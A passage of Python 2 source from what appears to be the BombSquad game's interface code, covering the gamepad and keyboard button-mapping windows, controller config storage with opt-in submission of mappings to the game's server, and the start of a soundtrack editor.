                    size=(0, 0),
                    text=bs.Lstr(
                        resource=self._r + '.ignoredButtonDescriptionText'),
                    color=(0.7, 1, 0.7, 0.6),
                    scale=0.8, maxWidth=self._subWidth * 0.8, hAlign='center',
                    vAlign='center')

                v -= 80
                c1 = bs.checkBoxWidget(
                    parent=self._subContainer, autoSelect=True,
                    position=(h + 50, v),
                    size=(400, 30),
                    text=bs.Lstr(
                        resource=self._r + '.startButtonActivatesDefaultText'),
                    textColor=(0.8, 0.8, 0.8),
                    maxWidth=450, scale=0.9,
                    onValueChangeCall=self._parentWindow.
                    _setStartButtonActivatesDefaultWidgetValue,
                    value=self._parentWindow.
                    _getStartButtonActivatesDefaultWidgetValue())
                bs.textWidget(
                    parent=self._subContainer,
                    position=(self._subWidth * 0.5, v - 12),
                    size=(0, 0),
                    text=bs.Lstr(
                        resource=self._r +
                        '.startButtonActivatesDefaultDescriptionText'),
                    color=(0.7, 1, 0.7, 0.6),
                    maxWidth=self._subWidth * 0.8, scale=0.7, hAlign='center',
                    vAlign='center')

                v -= 80
                c1 = bs.checkBoxWidget(
                    parent=self._subContainer, autoSelect=True,
                    position=(h + 50, v),
                    size=(400, 30),
                    text=bs.Lstr(resource=self._r + '.uiOnlyText'),
                    textColor=(0.8, 0.8, 0.8),
                    maxWidth=450, scale=0.9,
                    onValueChangeCall=self._parentWindow._setUIOnlyValue,
                    value=self._parentWindow._getUIOnlyValue())
                bs.textWidget(
                    parent=self._subContainer,
                    position=(self._subWidth * 0.5, v - 12),
                    size=(0, 0),
                    text=bs.Lstr(
                        resource=self._r + '.uiOnlyDescriptionText'),
                    color=(0.7, 1, 0.7, 0.6),
                    maxWidth=self._subWidth * 0.8, scale=0.7, hAlign='center',
                    vAlign='center')

                v -= 80
                c1 = bs.checkBoxWidget(
                    parent=self._subContainer, autoSelect=True,
                    position=(h + 50, v),
                    size=(400, 30),
                    text=bs.Lstr(
                        resource=self._r + '.ignoreCompletelyText'),
                    textColor=(0.8, 0.8, 0.8),
                    maxWidth=450, scale=0.9,
                    onValueChangeCall=self._parentWindow.
                    _setIgnoreCompletelyValue,
                    value=self._parentWindow._getIgnoreCompletelyValue())
                bs.textWidget(
                    parent=self._subContainer,
                    position=(self._subWidth * 0.5, v - 12),
                    size=(0, 0),
                    text=bs.Lstr(
                        resource=self._r + '.ignoreCompletelyDescriptionText'),
                    color=(0.7, 1, 0.7, 0.6),
                    maxWidth=self._subWidth * 0.8, scale=0.7, hAlign='center',
                    vAlign='center')

                v -= 80

                c1 = bs.checkBoxWidget(
                    parent=self._subContainer, autoSelect=True,
                    position=(h + 50, v),
                    size=(400, 30),
                    text=bs.Lstr(resource=self._r + '.autoRecalibrateText'),
                    textColor=(0.8, 0.8, 0.8),
                    maxWidth=450, scale=0.9,
                    onValueChangeCall=self._parentWindow.
                    _setAutoRecalibrateAnalogStickValue,
                    value=self._parentWindow.
                    _getAutoRecalibrateAnalogStickValue())
                bs.textWidget(
                    parent=self._subContainer,
                    position=(self._subWidth * 0.5, v - 12),
                    size=(0, 0),
                    text=bs.Lstr(
                        resource=self._r + '.autoRecalibrateDescriptionText'),
                    color=(0.7, 1, 0.7, 0.6),
                    maxWidth=self._subWidth * 0.8, scale=0.7, hAlign='center',
                    vAlign='center')
                v -= 80

                buttons = self._configValueEditor(
                    bs.Lstr(resource=self._r + '.analogStickDeadZoneText'),
                    control='analogStickDeadZone' + self._parentWindow._ext,
                    position=(h + 40, v),
                    minVal=0, maxVal=10.0, increment=0.1, xOffset=100)
                bs.widget(edit=buttons[0], leftWidget=c1, upWidget=c1)
                bs.widget(
                    edit=c1, rightWidget=buttons[0],
                    downWidget=buttons[0])

                bs.textWidget(parent=self._subContainer,
                              position=(self._subWidth * 0.5, v - 12),
                              size=(0, 0),
                              text=bs.Lstr(
                                  resource=self._r +
                                  '.analogStickDeadZoneDescriptionText'),
                              color=(0.7, 1, 0.7, 0.6),
                              maxWidth=self._subWidth * 0.8, scale=0.7,
                              hAlign='center', vAlign='center')
                v -= 100

                # child joysticks cant have child joysticks.. that's just
                # crazy talk
                if not self._parentWindow._isSecondary:
                    bs.buttonWidget(
                        parent=self._subContainer, autoSelect=True,
                        label=bs.Lstr(
                            resource=self._r + '.twoInOneSetupText'),
                        position=(40, v),
                        size=(self._subWidth - 80, 50),
                        onActivateCall=self._parentWindow._showSecondaryEditor,
                        upWidget=buttons[0])

                # set a bigger bottom show-buffer for the widgets we just made
                # so we can see the text below them when navigating with
                # a gamepad
                for w in self._subContainer.getChildren():
                    bs.widget(edit=w, showBufferBottom=30, showBufferTop=30)

            def _captureButton(self, pos, name, control, message=bs.Lstr(
                    resource=self._r + '.pressAnyButtonText')):
                b = bs.buttonWidget(parent=self._subContainer, autoSelect=True,
                                    position=(pos[0], pos[1]), label=name,
                                    size=(250, 60), scale=0.7)
                b2 = bs.buttonWidget(
                    parent=self._subContainer, autoSelect=True,
                    position=(pos[0] + 400, pos[1] + 2),
                    leftWidget=b, color=(0.45, 0.4, 0.5),
                    textColor=(0.65, 0.6, 0.7),
                    label=bs.Lstr(resource=self._r + '.clearText'),
                    size=(110, 50),
                    scale=0.7, onActivateCall=bs.Call(
                        self._clearControl, control))
                bs.widget(edit=b, rightWidget=b2)
                # make this in a timer so that it shows up on top of all
                # other buttons

                def foo():
                    t = bs.textWidget(
                        parent=self._subContainer,
                        position=(pos[0] + 285, pos[1] + 20),
                        color=(1, 1, 1, 0.3),
                        size=(0, 0),
                        hAlign='center', vAlign='center', scale=0.7,
                        text=self._parentWindow._getControlValueName(control),
                        maxWidth=200)
                    self._textWidgets[control] = t
                    bs.buttonWidget(
                        edit=b, onActivateCall=bs.Call(
                            AwaitGamePadInputWindow, self._parentWindow._input,
                            control, self._gamePadEvent, message))
                bs.realTimer(0, foo)
                return [b, b2]

            def _inc(self, control, minVal, maxVal, inc):
                try:
                    val = self._parentWindow._settings[control]
                except Exception:
                    val = 1.0
                val = min(maxVal, max(minVal, val+inc))
                if abs(1.0-val) < 0.001:
                    if control in self._parentWindow._settings:
                        del(self._parentWindow._settings[control])
                else:
                    self._parentWindow._settings[control] = round(val, 1)
                bs.textWidget(
                    edit=self._textWidgets[control],
                    text=self._parentWindow._getControlValueName(control))

            def _configValueEditor(
                    self, name, control, position, type='float', minVal=0,
                    maxVal=100, increment=1.0, callback=None, changeSound=True,
                    xOffset=0, displayName=None, textScale=1.0):

                if displayName is None:
                    displayName = name
                t = bs.textWidget(
                    parent=self._subContainer, position=position, size=(100,
                                                                        30),
                    text=displayName, color=(0.8, 0.8, 0.8, 1.0),
                    hAlign="left", vAlign="center", scale=1.0, maxWidth=280)
                if type == 'string':
                    raise Exception("fixme unimplemented")
                else:
                    self._textWidgets[control] = t = bs.textWidget(
                        parent=self._subContainer,
                        position=(246 + xOffset, position[1]),
                        size=(60, 28),
                        editable=False, color=(0.3, 1.0, 0.3, 1.0),
                        hAlign="right", vAlign="center",
                        text=self._parentWindow._getControlValueName(control),
                        padding=2)
                    b = bs.buttonWidget(
                        parent=self._subContainer, autoSelect=True,
                        position=(330 + xOffset, position[1] + 4),
                        size=(28, 28),
                        label="-", onActivateCall=bs.Call(
                            self._inc, control, minVal, maxVal, -increment),
                        repeat=True, enableSound=(changeSound is True))
                    b2 = bs.buttonWidget(
                        parent=self._subContainer, autoSelect=True,
                        position=(380 + xOffset, position[1] + 4),
                        size=(28, 28),
                        label="+", onActivateCall=bs.Call(
                            self._inc, control, minVal, maxVal, increment),
                        repeat=True, enableSound=(changeSound is True))
                    return (b, b2)

            def _clearControl(self, control):
                e = self._parentWindow._ext
                if control in self._parentWindow._settings:
                    del(self._parentWindow._settings[control])
                bs.textWidget(
                    edit=self._textWidgets[control],
                    text=self._parentWindow._getControlValueName(control))

            def _gamePadEvent(self, control, event, dialog):
                e = self._parentWindow._ext
                if control in ['triggerRun1'+e, 'triggerRun2'+e]:
                    if event['type'] == 'AXISMOTION':
                        # ignore small values or else we might get triggered
                        # by noise
                        if abs(event['value']) > 0.5:
                            self._parentWindow._settings[control] = \
                                event['axis']
                            # update the button's text widget
                            if self._textWidgets[control].exists():
                                bs.textWidget(
                                    edit=self._textWidgets[control],
                                    text=self._parentWindow
                                    ._getControlValueName(control))
                            bs.playSound(bs.getSound('gunCocking'))
                            dialog.die()
                else:
                    if event['type'] == 'BUTTONDOWN':
                        value = event['button']
                        self._parentWindow._settings[control] = value
                        # update the button's text widget
                        if self._textWidgets[control].exists():
                            bs.textWidget(
                                edit=self._textWidgets[control],
                                text=self._parentWindow._getControlValueName(
                                    control))
                        bs.playSound(bs.getSound('gunCocking'))
                        dialog.die()

            def _done(self):
                bs.containerWidget(edit=self._rootWidget, transition='outScale')

        w = _AdvancedWindow(self)

    def _enableCheckBoxChanged(self, value):
        if value:
            self._settings['enableSecondary'] = 1
        else:
            if 'enableSecondary' in self._settings:
                del self._settings['enableSecondary']

    def _getUnassignedButtonsRunValue(self):
        if 'unassignedButtonsRun' in self._settings:
            return self._settings['unassignedButtonsRun']
        else:
            return True

    def _setUnassignedButtonsRunValue(self, value):
        if value:
            if 'unassignedButtonsRun' in self._settings:
                # clear since this is default
                del(self._settings['unassignedButtonsRun'])
        else:
            self._settings['unassignedButtonsRun'] = False

    def _getStartButtonActivatesDefaultWidgetValue(self):
        if 'startButtonActivatesDefaultWidget' in self._settings:
            return self._settings['startButtonActivatesDefaultWidget']
        else:
            return True

    def _setStartButtonActivatesDefaultWidgetValue(self, value):
        if value:
            if 'startButtonActivatesDefaultWidget' in self._settings:
                # clear since this is default
                del(self._settings['startButtonActivatesDefaultWidget'])
        else:
            self._settings['startButtonActivatesDefaultWidget'] = False

    def _getUIOnlyValue(self):
        if 'uiOnly' in self._settings:
            return self._settings['uiOnly']
        else:
            return False

    def _setUIOnlyValue(self, value):
        if not value:
            if 'uiOnly' in self._settings:
                del(self._settings['uiOnly'])  # clear since this is default
        else:
            self._settings['uiOnly'] = True

    def _getIgnoreCompletelyValue(self):
        if 'ignoreCompletely' in self._settings:
            return self._settings['ignoreCompletely']
        else:
            return False

    def _setIgnoreCompletelyValue(self, value):
        if not value:
            if 'ignoreCompletely' in self._settings:
                # clear since this is default
                del(self._settings['ignoreCompletely'])
        else:
            self._settings['ignoreCompletely'] = True

    def _getAutoRecalibrateAnalogStickValue(self):
        if 'autoRecalibrateAnalogStick' in self._settings:
            return self._settings['autoRecalibrateAnalogStick']
        else:
            return False

    def _setAutoRecalibrateAnalogStickValue(self, value):
        if not value:
            if 'autoRecalibrateAnalogStick' in self._settings:
                # clear since this is default
                del(self._settings['autoRecalibrateAnalogStick'])
        else:
            self._settings['autoRecalibrateAnalogStick'] = True

    def _getEnableSecondaryValue(self):
        if not self._isSecondary:
            raise Exception("enable value only applies to secondary editor")
        if 'enableSecondary' in self._settings:
            return self._settings['enableSecondary']
        else:
            return False

    def _showSecondaryEditor(self):
        GamePadConfigWindow(
            self._input, isMainMenu=False, settings=self._settings,
            transition='inScale', transitionOut='outScale')

    def _getControlValueName(self, control):

        if control == 'analogStickLR'+self._ext:
            # this actually shows both LR and UD
            s1 = self._settings['analogStickLR'+self._ext] if 'analogStickLR' \
                + self._ext in self._settings else 5 if self._isSecondary else 1
            s2 = self._settings['analogStickUD'+self._ext] if 'analogStickUD' \
                + self._ext in self._settings else 6 if self._isSecondary else 2
            return self._input.getAxisName(s1)+' / '+self._input.getAxisName(s2)

        # if they're looking for triggers
        if control in ['triggerRun1'+self._ext, 'triggerRun2'+self._ext]:
            if control in self._settings:
                return self._input.getAxisName(self._settings[control])
            else:
                return bs.Lstr(resource=self._r+'.unsetText')

        # dead-zone
        if control == 'analogStickDeadZone'+self._ext:
            if control in self._settings:
                return str(self._settings[control])
            else:
                return str(1.0)

        # for dpad buttons: show individual buttons if any are set..
        # otherwise show whichever dpad is set (defaulting to 1)
        dPadButtons = ['buttonLeft' + self._ext, 'buttonRight' + self._ext,
                       'buttonUp' + self._ext, 'buttonDown' + self._ext]
        if control in dPadButtons:
            # if *any* dpad buttons are assigned, show only button assignments
            if any(b in self._settings for b in dPadButtons):
                if control in self._settings:
                    return self._input.getButtonName(self._settings[control])
                else:
                    return bs.Lstr(resource=self._r+'.unsetText')
            # no dpad buttons - show the dpad number for all 4
            else:
                return bs.Lstr(
                    value='${A} ${B}',
                    subs=[('${A}', bs.Lstr(
                        resource=self._r + '.dpadText')),
                        ('${B}',
                         str(
                             self._settings['dpad' + self._ext]
                             if 'dpad' + self._ext in self._settings else 2
                             if self._isSecondary else 1))])

        # other buttons..
        if control in self._settings:
            return self._input.getButtonName(self._settings[control])
        else:
            return bs.Lstr(resource=self._r+'.unsetText')

    def _gamePadEvent(self, control, event, dialog):
        e = self._ext
        # for our dpad-buttons we're looking for either a button-press or a
        # hat-switch press
        if control in ['buttonUp' + e, 'buttonLeft' + e,
                       'buttonDown' + e, 'buttonRight' + e]:
            if event['type'] in ['BUTTONDOWN', 'HATMOTION']:
                # if its a button-down..
                if event['type'] == 'BUTTONDOWN':
                    value = event['button']
                    self._settings[control] = value
                # if its a dpad
                elif event['type'] == 'HATMOTION':
                    # clear out any set dir-buttons
                    for b in [
                        'buttonUp' + e, 'buttonLeft' + e, 'buttonRight' + e,
                            'buttonDown' + e]:
                        if b in self._settings:
                            del(self._settings[b])
                    if event['hat'] == (2 if self._isSecondary else 1):
                        # exclude value in default case
                        if 'dpad'+e in self._settings:
                            del(self._settings['dpad'+e])
                    else:
                        self._settings['dpad'+e] = event['hat']
                # update the 4 dpad button txt widgets
                bs.textWidget(
                    edit=self._textWidgets['buttonUp' + e],
                    text=self._getControlValueName('buttonUp' + e))
                bs.textWidget(
                    edit=self._textWidgets['buttonLeft' + e],
                    text=self._getControlValueName('buttonLeft' + e))
                bs.textWidget(
                    edit=self._textWidgets['buttonRight' + e],
                    text=self._getControlValueName('buttonRight' + e))
                bs.textWidget(
                    edit=self._textWidgets['buttonDown' + e],
                    text=self._getControlValueName('buttonDown' + e))
                bs.playSound(bs.getSound('gunCocking'))
                dialog.die()

        elif control == 'analogStickLR'+e:
            if event['type'] == 'AXISMOTION':
                # ignore small values or else we might get triggered by noise
                if abs(event['value']) > 0.5:
                    axis = event['axis']
                    if axis == (5 if self._isSecondary else 1):
                        # exclude value in default case
                        if 'analogStickLR'+e in self._settings:
                            del(self._settings['analogStickLR'+e])
                    else:
                        self._settings['analogStickLR'+e] = axis
                    bs.textWidget(
                        edit=self._textWidgets['analogStickLR' + e],
                        text=self._getControlValueName('analogStickLR' + e))
                    bs.playSound(bs.getSound('gunCocking'))
                    dialog.die()
                    # now launch the up/down waiter
                    AwaitGamePadInputWindow(self._input, 'analogStickUD' + e,
                                            self._gamePadEvent, bs.Lstr(
                                                resource=self._r +
                                                '.pressUpDownText'))

        elif control == 'analogStickUD'+e:
            if event['type'] == 'AXISMOTION':
                # ignore small values or else we might get triggered by noise
                if abs(event['value']) > 0.5:
                    axis = event['axis']
                    # ignore our LR axis
                    if 'analogStickLR'+e in self._settings:
                        lrAxis = self._settings['analogStickLR'+e]
                    else:
                        lrAxis = (5 if self._isSecondary else 1)
                    if axis != lrAxis:
                        if axis == (6 if self._isSecondary else 2):
                            # exclude value in default case
                            if 'analogStickUD'+e in self._settings:
                                del(self._settings['analogStickUD'+e])
                        else:
                            self._settings['analogStickUD'+e] = axis
                        bs.textWidget(
                            edit=self._textWidgets['analogStickLR' + e],
                            text=self._getControlValueName(
                                'analogStickLR' + e))
                        #print 'WOULD CHANGE TXT'
                        bs.playSound(bs.getSound('gunCocking'))
                        dialog.die()
        else:
            # for other buttons we just want a button-press
            if event['type'] == 'BUTTONDOWN':
                value = event['button']
                self._settings[control] = value
                # update the button's text widget
                bs.textWidget(
                    edit=self._textWidgets[control],
                    text=self._getControlValueName(control))
                bs.playSound(bs.getSound('gunCocking'))
                dialog.die()

    def _captureButton(
            self, pos, color, texture, button, scale=1.0, message=None,
            message2=None, maxWidth=80):
        if message is None:
            message = bs.Lstr(resource=self._r+'.pressAnyButtonText')

        baseSize = 79
        b = bs.buttonWidget(
            parent=self._rootWidget,
            position=(pos[0] - baseSize * 0.5 * scale, pos[1] - baseSize * 0.5 *
                      scale),
            autoSelect=True, size=(baseSize * scale, baseSize * scale),
            texture=texture, label='', color=color)
        # make this in a timer so that it shows up on top of all other buttons

        def foo():
            uiScale = 0.9*scale
            t = bs.textWidget(
                parent=self._rootWidget,
                position=(pos[0] + 0.0 * scale, pos[1] - 58.0 * scale),
                color=(1, 1, 1, 0.3),
                size=(0, 0),
                hAlign='center', vAlign='center', scale=uiScale,
                text=self._getControlValueName(button),
                maxWidth=maxWidth)
            self._textWidgets[button] = t
            bs.buttonWidget(edit=b, onActivateCall=bs.Call(
                AwaitGamePadInputWindow, self._input, button,
                self._gamePadEvent, message, message2))

        bs.realTimer(0, foo)
        return b

    def _cancel(self):
        bs.containerWidget(edit=self._rootWidget,
                           transition=self._transitionOut)
        if self._isMainMenu:
            uiGlobals['mainMenuWindow'] = ControllersWindow(
                transition='inLeft').getRootWidget()
        global gCanAskToConfigGamePads
        gCanAskToConfigGamePads = True

    def _save(self):

        bs.containerWidget(edit=self._rootWidget,
                           transition=self._transitionOut)

        # if we're a secondary editor we just go away (we were editing our
        # parent's settings dict)
        if self._isSecondary:
            return

        if self._input.exists():
            dst = getConfigLocationForInputDevice(self._input, default=True)
            dst = dst[0][dst[1]]
            dst.clear()
            # store any values that aren't -1
            for key, val in self._settings.items():
                if val != -1:
                    dst[key] = val
            # if we're allowed to phone home, send this config so we can
            # generate more defaults in the future
            if bsUtils._shouldSubmitDebugInfo():
                bsUtils.serverPut(
                    'controllerConfig',
                    {'ua': bs.getEnvironment()['userAgentString'],
                     'name': self._name,
                     'inputMapHash': getInputMapHash(self._input),
                     'config': dst, 'v': 2})
            bs.applySettings()
            bs.writeConfig()
            bs.playSound(bs.getSound('gunCocking'))
        else:
            bs.playSound(bs.getSound('error'))

        if self._isMainMenu:
            uiGlobals['mainMenuWindow'] = ControllersWindow(
                transition='inLeft').getRootWidget()
        global gCanAskToConfigGamePads
        gCanAskToConfigGamePads = True


class ConfigKeyboardWindow(Window):

    def __init__(self, c, transition='inRight'):

        self._r = 'configKeyboardWindow'
        self._input = c
        self._name = self._input.getName()
        self._uniqueID = self._input.getUniqueIdentifier()
        self._displayName = self._name
        if self._uniqueID != '#1':
            self._displayName += ' '+self._uniqueID.replace('#', 'P')
        self._displayName = bs.Lstr(translate=(
            'inputDeviceNames', self._displayName))
        buttonWidth = 240
        self._width = 700
        if self._uniqueID != "#1":
            self._height = 450
        else:
            self._height = 345
        self._spacing = 40
        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height),
            scale=1.6 if gSmallUI else 1.3 if gMedUI else 1.0,
            stackOffset=(0, -10) if gSmallUI else(0, 0), transition=transition)

        # dont ask to config joysticks while we're in here..
        global gCanAskToConfigGamePads
        gCanAskToConfigGamePads = False

        self._rebuildUI()

    def _rebuildUI(self):

        for w in self._rootWidget.getChildren():
            w.delete()

        # fill our temp config with present values
        self._settings = {}
        for button in ['buttonJump', 'buttonPunch', 'buttonBomb',
                       'buttonPickUp', 'buttonStart', 'buttonStart2',
                       'buttonUp', 'buttonDown', 'buttonLeft', 'buttonRight']:
            self._settings[button] = getControllerValue(self._input, button)

        cancelButton = b = bs.buttonWidget(
            parent=self._rootWidget, autoSelect=True,
            position=(38, self._height - 65),
            size=(170, 60),
            label=bs.Lstr(resource='cancelText'),
            scale=0.9, onActivateCall=self._cancel)
        saveButton = b = bs.buttonWidget(
            parent=self._rootWidget, autoSelect=True,
            position=(self._width - 190, self._height - 65),
            size=(180, 60),
            label=bs.Lstr(resource='makeItSoText'),
            scale=0.9, textScale=0.9, onActivateCall=self._save)
        bs.containerWidget(
            edit=self._rootWidget, cancelButton=cancelButton,
            startButton=saveButton)

        bs.widget(edit=cancelButton, rightWidget=saveButton)
        bs.widget(edit=saveButton, leftWidget=cancelButton)

        v = self._height - 54
        t = bs.textWidget(
            parent=self._rootWidget, position=(self._width * 0.5, v + 15),
            size=(0, 0),
            text=bs.Lstr(
                resource=self._r + '.configuringText',
                subs=[('${DEVICE}', self._displayName)]),
            color=gTitleColor, hAlign='center', vAlign='center', maxWidth=270,
            scale=0.83)
        v -= 20

        if self._uniqueID != "#1":
            v -= 20
            v -= self._spacing
            t = bs.textWidget(
                parent=self._rootWidget, position=(0, v + 19),
                size=(self._width, 50),
                text=bs.Lstr(resource=self._r + '.keyboard2NoteText'),
                scale=0.7, maxWidth=self._width * 0.75, maxHeight=110,
                color=gInfoTextColor, hAlign="center", vAlign="top")
            v -= 45
        v -= 10
        v -= self._spacing * 2.2

        v += 25
        v -= 42

        hOffs = 160
        dist = 70

        dColor = (0.4, 0.4, 0.8)
        self._captureButton(pos=(hOffs, v + 0.95 * dist),
                            color=dColor, button='buttonUp',
                            texture=bs.getTexture('upButton'),
                            scale=1.0)
        self._captureButton(
            pos=(hOffs - 1.2 * dist, v),
            color=dColor, button='buttonLeft', texture=bs.getTexture(
                'leftButton'),
            scale=1.0)
        self._captureButton(
            pos=(hOffs + 1.2 * dist, v),
            color=dColor, button='buttonRight', texture=bs.getTexture(
                'rightButton'),
            scale=1.0)
        self._captureButton(
            pos=(hOffs, v - 0.95 * dist),
            color=dColor, button='buttonDown', texture=bs.getTexture(
                'downButton'),
            scale=1.0)

        if self._uniqueID == "#2":
            self._captureButton(
                pos=(self._width * 0.5, v + 0.1 * dist),
                color=(0.4, 0.4, 0.6),
                button='buttonStart', texture=bs.getTexture('startButton'),
                scale=0.8)

        hOffs = self._width-160

        self._captureButton(
            pos=(hOffs, v + 0.95 * dist),
            color=(0.6, 0.4, 0.8),
            button='buttonPickUp', texture=bs.getTexture('buttonPickUp'),
            scale=1.0)
        self._captureButton(
            pos=(hOffs - 1.2 * dist, v),
            color=(0.7, 0.5, 0.1),
            button='buttonPunch', texture=bs.getTexture('buttonPunch'),
            scale=1.0)
        self._captureButton(
            pos=(hOffs + 1.2 * dist, v),
            color=(0.5, 0.2, 0.1),
            button='buttonBomb', texture=bs.getTexture('buttonBomb'),
            scale=1.0)
        self._captureButton(
            pos=(hOffs, v - 0.95 * dist),
            color=(0.2, 0.5, 0.2),
            button='buttonJump', texture=bs.getTexture('buttonJump'),
            scale=1.0)

    def _captureButton(self, pos, color, texture, button, scale=1.0):
        baseSize = 79
        b = bs.buttonWidget(
            parent=self._rootWidget, autoSelect=True,
            position=(pos[0] - baseSize * 0.5 * scale, pos[1] - baseSize * 0.5 *
                      scale),
            size=(baseSize * scale, baseSize * scale),
            texture=texture, label='', color=color)
        # make this in a timer so that it shows up on top of all other buttons

        def foo():
            uiScale = 0.66*scale*2.0
            maxWidth = 76.0*scale
            t = bs.textWidget(
                parent=self._rootWidget,
                position=(pos[0] + 0.0 * scale, pos[1] - (57.0 - 18.0) * scale),
                color=(1, 1, 1, 0.3),
                size=(0, 0),
                hAlign='center', vAlign='top', scale=uiScale, maxWidth=maxWidth,
                text=self._input.getButtonName(self._settings[button]))
            bs.buttonWidget(edit=b, autoSelect=True, onActivateCall=bs.Call(
                AwaitKeyboardInputWindow, button, t, self._settings))

        bs.realTimer(0, foo)

    def _cancel(self):
        bs.containerWidget(edit=self._rootWidget, transition='outRight')
        uiGlobals['mainMenuWindow'] = ControllersWindow(
            transition='inLeft').getRootWidget()
        global gCanAskToConfigGamePads
        gCanAskToConfigGamePads = True

    def _save(self):
        bs.containerWidget(edit=self._rootWidget, transition='outRight')
        bs.playSound(bs.getSound('gunCocking'))

        dst = getConfigLocationForInputDevice(self._input, default=False)
        dst = dst[0][dst[1]]
        dst.clear()
        # store any values that aren't -1
        for key, val in self._settings.items():
            if val != -1:
                dst[key] = val
        # if we're allowed to phone home, send this config so we can generate
        # xmore defaults in the future
        if bsUtils._shouldSubmitDebugInfo():
            bsUtils.serverPut(
                'controllerConfig',
                {'ua': bs.getEnvironment()['userAgentString'],
                 'name': self._name, 'config': dst, 'v': 2})
        bs.applySettings()
        bs.writeConfig()

        uiGlobals['mainMenuWindow'] = ControllersWindow(
            transition='inLeft').getRootWidget()
        global gCanAskToConfigGamePads
        gCanAskToConfigGamePads = True


def getConfigLocationForInputDevice(device, default):
    bsConfig = bs.getConfig()
    name = device.getName()
    if not bsConfig.has_key("Controllers"):
        bsConfig["Controllers"] = {}
    jsconfig = bsConfig["Controllers"]
    if not jsconfig.has_key(name):
        jsconfig[name] = {}
    uniqueID = device.getUniqueIdentifier()
    if default:
        if jsconfig[name].has_key(uniqueID):
            del(jsconfig[name][uniqueID])
        if not 'default' in jsconfig[name]:
            jsconfig[name]['default'] = {}
        return jsconfig[name], 'default'
    else:
        if not uniqueID in jsconfig[name]:
            jsconfig[name][uniqueID] = {}
        return jsconfig[name], uniqueID


class EditSoundtrackWindow(Window):

    def __init__(self, existingSoundtrack, transition='inRight'):

        bsConfig = bs.getConfig()

        self._r = 'editSoundtrackWindow'

        self._folderTex = bs.getTexture('folder')
        self._fileTex = bs.getTexture('file')

        self._width = 848 if gSmallUI else 648
        xInset = 100 if gSmallUI else 0
        self._height = 395 if gSmallUI else 450 if gMedUI else 560
        spacing = 40
        buttonWidth = 350
        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height),
            transition=transition, scale=2.08
            if gSmallUI else 1.5 if gMedUI else 1.0, stackOffset=(0, -48)
            if gSmallUI else(0, 15) if gMedUI else(0, 0))

        cancelButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(38 + xInset, self._height - 60),
            size=(160, 60),
            autoSelect=True, label=bs.Lstr(resource='cancelText'),
            scale=0.8)
        saveButton = b = bs.buttonWidget(
            parent=self._rootWidget,
            position=(self._width - (168 + xInset),
                      self._height - 60),
            autoSelect=True, size=(160, 60),
            label=bs.Lstr(resource='saveText'),
            scale=0.8)
        bs.widget(edit=saveButton, leftWidget=cancelButton)
        bs.widget(edit=cancelButton, rightWidget=saveButton)
        t = bs.textWidget(
            parent=self._rootWidget, position=(0, self._height - 50),
            size=(self._width, 25),
            text=bs.Lstr(
                resource=self._r +
                ('.editSoundtrackText'
                 if existingSoundtrack is not None else '.newSoundtrackText')),
            color=gTitleColor, hAlign="center", vAlign="center", maxWidth=280)
        v = self._height - 110

        # make sure config exists
        try:
            bsConfig['Soundtracks']
        except Exception:
            bsConfig['Soundtracks'] = {}

        if existingSoundtrack is not None:
            # if they passed just a name, pull info from that soundtrack
            if type(existingSoundtrack) is unicode:
                self._soundtrack = copy.deepcopy(
                    bsConfig['Soundtracks'][existingSoundtrack])
                self._soundtrackName = existingSoundtrack
                self._existingSoundtrackName = existingSoundtrack
                self._lastEditedSongType = None
            elif type(existingSoundtrack) is str:
                print 'ERROR; got str existingSoundtrack'
            else:
                # otherwise they can pass info on an in-progress edit
                self._soundtrack = existingSoundtrack['soundtrack']
                self._soundtrackName = existingSoundtrack['name']
                self._existingSoundtrackName = \
                    existingSoundtrack['existingName']
                self._lastEditedSongType = \
                    existingSoundtrack['lastEditedSongType']
        else:
            self._soundtrackName = None
            self._existingSoundtrackName = None
            self._soundtrack = {}
            self._lastEditedSongType = None

        bs.textWidget(
            parent=self._rootWidget, text=bs.Lstr(
                resource=self._r + '.nameText'),
            maxWidth=80, scale=0.8, position=(105 + xInset, v + 19),
            color=(0.8, 0.8, 0.8, 0.5),
            size=(0, 0),
            hAlign='right', vAlign='center')

        # if there's no initial value, find a good initial unused name
        if existingSoundtrack is None:
            i = 1
            stNameText = bs.Lstr(
                resource=self._r+'.newSoundtrackNameText').evaluate()
            if '${COUNT}' not in stNameText:
                # make sure we insert number *somewhere*
                stNameText = stNameText+' ${COUNT}'
            while True:
                self._soundtrackName = stNameText.replace('${COUNT}', str(i))
                if self._soundtrackName not in bsConfig['Soundtracks']:
                    break
                i += 1

        self._textField = bs.textWidget(
            parent=self._rootWidget, position=(120 + xInset, v - 5),
            size=(self._width - (160 + 2 * xInset),
                  43),
            text=self._soundtrackName, hAlign="left", vAlign="center",
            maxChars=32, autoSelect=True, description=bs.Lstr(
                resource=self._r + '.nameText'),
            editable=True, padding=4, onReturnPressCall=self._doItWithSound)

        scrollHeight = self._height - 180
        self._scrollWidget = scrollWidget = bs.scrollWidget(
            parent=self._rootWidget, highlight=False,
            position=(40 + xInset, v - (scrollHeight + 10)),
            size=(self._width - (80 + 2 * xInset),
                  scrollHeight),
            simpleCullingV=10)
        bs.widget(edit=self._textField, downWidget=self._scrollWidget)
        self._col = bs.columnWidget(parent=scrollWidget)

        bs.containerWidget(
            edit=self._scrollWidget, claimsLeftRight=True, claimsTab=True,
            selectionLoopToParent=True)
        bs.containerWidget(
            edit=self._col, claimsLeftRight=True, claimsTab=True,
            selectionLoopToParent=True)

        self._songTypeButtons = {}
        self._refresh()
        bs.buttonWidget(edit=cancelButton, onActivateCall=self._cancel)
        bs.containerWidget(edit=self._rootWidget, cancelButton=cancelButton)
        bs.buttonWidget(edit=saveButton, onActivateCall=self._doIt)
        bs.containerWidget(edit=self._rootWidget, startButton=saveButton)

        bs.widget(edit=self._textField, upWidget=cancelButton)
        bs.widget(edit=cancelButton, downWidget=self._textField)

    def _refresh(self):
        for w in self._col.getChildren():
            w.delete()

        types = ['Menu',
                 'CharSelect',
                 'ToTheDeath',
                 'Onslaught',
                 'Keep Away',
                 'Race',
                 'Epic Race',
                 'ForwardMarch',
                 'FlagCatcher',
                 'Survival',
                 'Epic',
                 'Hockey',
                 'Football',
                 'Flying',
                 'Scary',
                 'Marching',
                 'GrandRomp',
                 'Chosen One',
                 'Scores',
                 'Victory',
                 ]
        # FIXME - we should probably convert this to use translations...
        typeNamesTranslated = bsUtils._getResource('soundtrackTypeNames')
        prevTypeButton = None
        prevTestButton = None

